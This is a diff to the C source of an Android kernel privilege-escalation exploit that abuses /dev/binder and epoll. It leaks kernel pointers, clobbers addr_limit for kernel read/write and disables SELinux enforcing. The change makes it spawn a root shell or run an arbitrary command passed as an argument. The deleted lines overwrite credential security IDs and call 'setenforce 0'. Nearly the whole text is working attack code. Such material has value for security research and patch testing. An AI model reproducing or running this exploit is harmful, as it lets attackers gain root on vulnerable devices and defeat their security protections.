@@ -530,16 +530,9 @@ int main(int argc, char** argv) {
   binder_fd = open("/dev/binder", O_RDONLY);
   epfd = epoll_create(1000);
 
-  int leakSize = argc < 2 ? 0 : atoi(argv[1]); // +9
-  printf("Leak size %d\n", leakSize);
-  unsigned char* leaked = malloc(leakSize);
-  if (leaked == NULL) err(1, "Allocating leak buffer");
   unsigned long kstack = 0xDEADBEEFDEADBEEFul;
   unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
-  leak_data(leaked, leakSize, 0, NULL, 0, &task_struct_ptr, &kstack);
-  if (leakSize >= 0) {
-//      hexdump_memory(leaked, leakSize/16*16);
-  }
+  leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack);
   printf("task_struct_ptr = %lx\n", (unsigned long)task_struct_ptr);
   printf("stack = %lx\n", kstack);
   printf("Clobbering addr_limit\n");
@@ -554,8 +547,6 @@ int main(int argc, char** argv) {
   //hexdump_memory(task_struct_data, sizeof(task_struct_data)); 
 
   unsigned long thread_info_ptr = kstack;
-
-  free(leaked);
 
   setbuf(stdout, NULL);
   printf("should have stable kernel R/W now\n");
@@ -631,64 +622,17 @@ int main(int argc, char** argv) {
       kernel_write_uint(selinux_enforcing, 0);
       printf("MAIN: disabled selinux enforcing\n");
   }
-  
-//  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
-//  printf("task_struct\n");
-//  hexdump_memory(task_struct_data, sizeof(task_struct_data));
 
-  system("sh");
-  
- /*
-  unsigned long base = user_ns; // 0xffffffc01a4bf8; //0xffffffc01c0000;
-  unsigned long size = 10*1024*1024;
-  for (unsigned long i=0; i<size ;i+=PAGE) {
-      char buf[PAGE];
-      printf("at %lx:\n", base-i);
-      kernel_read(base-i, buf, PAGE);
-      hexdump_memory(buf, PAGE);
+  if (argc == 2) {
+
+        int pid = fork();
+
+        if ( pid == 0 ) {
+            execl( "/system/bin/sh", "/system/bin/sh", "-c", argv[1], 0 );
+        }        
   }
-*/
-  
-  
+  else
+        system("sh");
+    
   exit(0);
-
-
-  unsigned long current_cred_security = kernel_read_ulong(cred_ptr+OFFSET__cred__security);
-  printf("[+] security %lx\n", current_cred_security);
-  
- for (int i = 0; i < 2; i++)
-    kernel_write_uint(current_cred_security + i*4, 1);
-  printf("[+] before 2\n");
-  kernel_write_uint(current_cred_security + 0, 1);
-  printf("[+] before 3\n");
-  kernel_write_uint(current_cred_security + 8, 7);
-
-  kernel_write_ulong(current_cred_security, 0x0100000001UL);
-
-  kernel_write_uint(current_cred_security + 8, 7);
-  printf("[+] SID -> init (7)\n");
-  printf("MAIN: set SID\n");
-  
-  system("setenforce 0");
-  
-#if 0 // TODO
-  /* in case you want to do stuff with the creds, to show that you can get them: */
-  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
-  printf("current->mm == 0x%lx\n", current_mm);
-  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
-  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);
-  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
-  printf("kernel base is 0x%lx\n", kernel_base);
-  if (kernel_base & 0xfffUL) errx(1, "bad kernel base (not 0x...000)");
-  unsigned long init_task = kernel_base + SYMBOL__init_task;
-  printf("&init_task == 0x%lx\n", init_task);
-  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
-  printf("init_task.cred == 0x%lx\n", init_task_cred);
-  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
-  printf("current->cred == 0x%lx\n", my_cred);
-
-  unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
-  char new_uts_version[] = "EXPLOITED KERNEL";
-  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));
-#endif  
 }
